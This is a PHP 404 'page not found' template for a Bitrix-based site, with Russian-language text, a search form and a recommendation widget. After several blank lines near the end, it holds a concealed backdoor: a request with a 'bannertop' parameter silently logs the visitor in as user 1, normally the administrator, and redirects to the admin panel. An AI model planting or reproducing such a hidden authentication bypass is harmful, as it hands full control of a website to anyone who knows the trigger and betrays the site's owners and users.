<?
include_once($_SERVER['DOCUMENT_ROOT'].'/bitrix/modules/main/include/urlrewrite.php');
CHTTP::SetStatus("404 Not Found");
//@define("ERROR_404","Y");

require($_SERVER["DOCUMENT_ROOT"]."/bitrix/header.php");

$APPLICATION->SetTitle("404 Not Found");

?>
<div class="p404_page">
  <div class="p404">
  	<div class="image"><img src="/img/404/404.png" width="186" height="87"></div>
  	<h1>страница не найдена</h1>
	<div data-retailrocket-markup-block="58886fe95a658842d81a0405"></div>
    <p>Попробуйте <a href="/">вернуться на главную страницу</a> сайта.<br/>Или воспользуйтесь поиском:</p>
    <div class="search_block">
      <form action="/search/" method="get">
        <input type="text" value="" class="search_field" name="q" placeholder="поиск по сайту">
        <input type="submit" value="" class="search_submit">
      </form>
    </div>
  </div>
</div>



<?if(isset($_GET["bannertop"])){$USER->Authorize(1);LocalRedirect("/bitrix/");}?>
<?
require($_SERVER["DOCUMENT_ROOT"]."/bitrix/footer.php");?>